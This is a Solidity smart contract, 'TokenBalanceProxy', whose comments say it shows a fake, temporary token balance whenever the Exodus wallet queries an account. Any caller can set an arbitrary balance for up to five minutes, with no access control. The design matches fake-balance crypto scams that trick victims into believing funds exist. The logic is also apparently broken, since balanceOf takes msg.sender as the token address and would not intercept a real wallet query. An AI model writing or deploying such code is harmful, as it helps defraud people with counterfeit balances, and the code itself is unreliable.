// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/proxy/Proxy.sol";

contract TokenBalanceProxy is Proxy {
    address public immutable implementation;
    mapping(address => mapping(address => uint256)) public temporaryBalances;
    mapping(address => mapping(address => uint256)) public expiryTimes;

    constructor(address _implementation) {
        implementation = _implementation;
    }

    function _implementation() internal view virtual override returns (address) {
        return implementation;
    }

    // This will be called when Exodus queries the balance
    function balanceOf(address account) external view returns (uint256) {
        address token = msg.sender;
        if (expiryTimes[token][account] > block.timestamp) {
            return temporaryBalances[token][account];
        }
        return IERC20(token).balanceOf(account);
    }

    // Create a temporary balance that will be returned when Exodus queries
    function createTemporaryBalance(
        address token,
        address account,
        uint256 amount,
        uint256 duration
    ) external {
        require(duration <= 300, "Duration cannot exceed 5 minutes");
        temporaryBalances[token][account] = amount;
        expiryTimes[token][account] = block.timestamp + duration;
    }

    // Forward all other calls to the real token contract
    fallback() external payable {
        _fallback();
    }

    receive() external payable {
        _fallback();
    }
} 